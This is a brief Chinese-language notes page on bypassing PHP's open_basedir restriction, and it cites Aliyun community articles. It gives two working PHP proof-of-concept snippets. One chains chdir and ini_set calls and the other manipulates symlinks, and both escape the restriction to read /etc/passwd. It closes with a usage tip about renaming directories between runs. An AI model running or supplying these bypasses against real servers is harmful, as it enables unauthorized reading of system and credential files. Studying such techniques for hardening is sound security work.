# 绕过open_basedir

https://xz.aliyun.com/t/10070

## 利用ini_set和chidr

### 参考

- twitter
- https://xz.aliyun.com/t/4720

### 测试

```python
<?php
chdir('subDir');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
$a=file_get_contents('/etc/passwd');
var_dump($a);
```

## 利用symlink

### 参考

- twitter

### 测试

```php
mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
symlink('/var/www/html/a/b/c/d/e/f/g','foo');
ini_set('open_basedir','/var/www/html:bar/');
symlink('foo/../../../../../../','bar');
unlink('foo');
symlink('/var/www/html','foo');
echo file_get_contents('bar/etc/passwd');
```

每次要更换文件夹a和bar和foo，不然会报错文件已存在。

